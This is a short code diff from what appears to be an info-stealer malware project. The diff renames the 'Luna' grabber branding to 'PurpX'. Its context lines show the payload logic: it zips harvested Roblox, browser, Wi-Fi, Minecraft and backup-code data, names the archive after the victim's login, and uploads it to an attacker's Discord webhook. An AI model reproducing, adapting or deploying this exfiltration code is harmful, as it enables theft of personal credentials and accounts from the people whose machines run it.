@@ -60,11 +60,11 @@ def main(webhook: str):
     zipup()
 
     data = {
-        "username": "Luna",
+        "username": "PurpX",
         "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
     }
 
-    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'
+    _file = f'{localappdata}\\PurpX-Logged-{os.getlogin()}.zip'
 
     if __CONFIG__["ping"]:
         if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
@@ -73,7 +73,7 @@ def main(webhook: str):
 
     if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
         with open(_file, 'rb') as file:
-            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
+            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'PurpX-Logged-{os.getlogin()}.zip', file, 'application/zip')})
             requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
     else:
         requests.post(webhook, json=data)
